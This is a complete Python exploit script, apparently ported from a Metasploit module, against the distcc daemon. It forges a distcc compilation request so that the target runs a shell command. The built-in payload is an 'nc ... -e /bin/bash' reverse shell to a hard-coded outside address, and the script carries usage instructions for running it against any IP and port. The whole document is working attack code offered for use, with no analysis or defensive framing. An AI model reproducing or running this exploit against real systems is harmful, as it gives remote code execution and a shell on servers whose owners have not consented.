#!/usr/bin/python3

# Ported from Metasploit module - https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec

import socket
from sys import argv
import random
import string

if len(argv) != 3:
    print('Usage: ./distcc_exploit ip_addr port')
    exit(1)


def exploit(ip, port):

    # replace payload
    payload = "nc 10.10.14.23 6666 -e /bin/bash"
    try:
        print('[*] Attempting exploit...')
        distcc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        distcc_socket.connect((ip, int(port)))

        distcmd = generate_cmd("sh", "-c", payload)
        # encode() to bytes
        distcc_socket.send(distcmd.encode())

        dtag = random_string_digits(10)
        msg = ('DOTI0000000A' + dtag + '\n')
        distcc_socket.send(msg.encode())
        print("Check your reverse handler...")

        response = distcc_socket.recv(1024).decode('utf-8')
        print('[+] Response:\n', response)

    except socket.error:
        print('[!] Failed to exploit %s' % ip)

# generate fake request


def generate_cmd(*args):
    cmd = list(args) + ['#', '-c', 'main.c', '-o', 'main.o']

    # make it look like a compilation request
    request = 'DIST00000001' + 'ARGC' + str(len(cmd)).zfill(8)

    for c in cmd:
        # returns len(c) and pad it with zeroes such that there are 8 digits after ARGV
        request += 'ARGV' + "{0:0{1}x}".format(len(c), 8) + c

    return request

# generate a random string of letters and digits


def random_string_digits(string_length):
    # creates string with a set of all letters and digits
    letters_digits = string.ascii_letters + string.digits

    # creates a random string of string_length
    random_string = ''
    for i in range(string_length):
        random_string = random_string + random.choice(letters_digits)

    return random_string


exploit(argv[1], argv[2])
